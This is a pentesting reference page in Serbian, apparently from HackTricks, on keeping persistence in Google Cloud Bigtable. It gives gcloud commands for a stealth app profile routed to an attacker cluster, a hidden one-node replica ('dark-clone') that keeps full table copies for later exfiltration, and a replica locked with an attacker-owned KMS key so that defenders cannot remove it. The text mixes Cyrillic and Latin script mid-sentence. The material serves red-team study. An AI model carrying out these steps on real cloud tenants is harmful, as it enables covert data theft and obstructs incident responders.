# GCP - Bigtable Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Za više informacija o Bigtable pogledajte:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Dedicated attacker App Profile

**Dozvole:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Kreirajte app profile koji preusmerava saobraćaj na vaš replica cluster i omogućite Data Boost, tako da nikada ne budete zavisni od provisioned nodes koje branitelji mogu primetiti.

<details>

<summary>Kreirajte prikriveni app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Sve dok ovaj profil postoji, možete se ponovo povezati koristeći nove kredencijale koji se na njega pozivaju.

### Održavajte sopstveni klaster replika

**Dozvole:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Postavite klaster sa minimalnim brojem čvorova u manje prometnoj regiji. Čak i ako vaši klijentski identiteti nestanu, **klaster zadržava kompletnu kopiju svake tabele** dok ga odbrambeni tim eksplicitno ne ukloni.

<details>

<summary>Kreirajte klaster replika</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Prati to pomoću `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` kako би mogao odmah да повећаš капацитете кад треба да извлачиш податке.

### Закључај репликацију иза свог CMEK

**Dozvole:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` на кључу у власништву нападача.

Понеси свој KMS кључ када подижеш клон. Без тог кључа, Google не може поново креирати или извршити fail over кластера, па blue teams морају да се координишу са тобом пре него што га додирну.

<details>

<summary>Kreiraj klaster zaštićen CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Rotirajte ili onemogućite ključ u svom projektu da odmah onesposobite repliku (uz mogućnost da je kasnije ponovo uključite).

{{#include ../../../banners/hacktricks-training.md}}
